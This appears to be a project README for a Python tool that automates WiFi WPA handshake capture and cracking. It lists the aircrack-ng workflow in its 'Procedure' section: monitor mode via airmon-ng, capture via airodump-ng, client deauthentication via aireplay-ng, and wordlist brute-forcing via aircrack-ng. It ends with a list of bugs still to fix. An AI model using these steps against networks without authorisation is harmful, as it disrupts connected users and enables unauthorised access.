## How it works
- The entry point is master.py, which displays all the possible options.
- First option is to display all the available interfaces. In order to do this, master.py calls **listInterfaces** function which in turn calls DetectInterface.py with its execIW() function. The execIW() function runs ``ip link show`` to list all the available interfaces and stores the output in an ephemeral file **interfaces.txt**. **listInterfaces()** then does some string manipulation to carve out the interface names and deletes the **interfaces.txt** file. It also returns the interfaces list to master.py which is then displayed.



## Procedure[David Bombal video]
1. Select a Wireless Adapter that supports monitor mode and packet injection
2. Choose a WiFi network or AP to attack [DONE]
3. Run `sudo airmon-ng check kill` to kill any conflicting processes [Ignoring for now]
4. Run `sudo airmon-ng start {interface}` to activate Monitor Mode
5. Run `sudo airodump-ng {interface}mon` to get the AP's MAC address and channel and MAC of one client connected to it
6. In one window, `sudo airodump-ng -w {output file} -c {channel} --bssid {MAC of AP} {interface}mon`.This will keep outputting packets as a pcap file.
7. In second window, `sudo aireplay-ng --deauth 1 -a {MAC of AP} -c {MAC of client} {interface}mon`. This performs the deauth.
8. After 10 seconds, stop the outputting of packets in the first window.
9. Put interface back into managed mode
10. Check presence of eapol packets in the capture
11. Run `aircrack-ng hack-01.cap -w {wordlist}` to brute force the key data present in hack-01.cap output file.
------------------------------------------------------------------------------------------------------------------------------------------------------------

## Errors to fix
1. If interface is already in monitor mode, do not return "Interface does not support monitor mode". Instead deactivate it, then resume normal operation [FIXED]
2. Check for packet injection on the wireless interface as well [FIXED]
3. Weird issues persisting in scanning. Try to kill conflicting processes [FIXED]
4. Unpredictable naming conventions of the Interfaces is problematic 
5. Packet Injection test does not work if interface is in Monitor Mode already.
6. The Clients take variable time to reconnect to target AP. Gotta account for it.
7. The procedure to return MACs and channel is erronous. The way the file handling is done needs to be changed.
8. Gotta put every procedure thats giving errors in a loop, caue a lot of them work the second time.
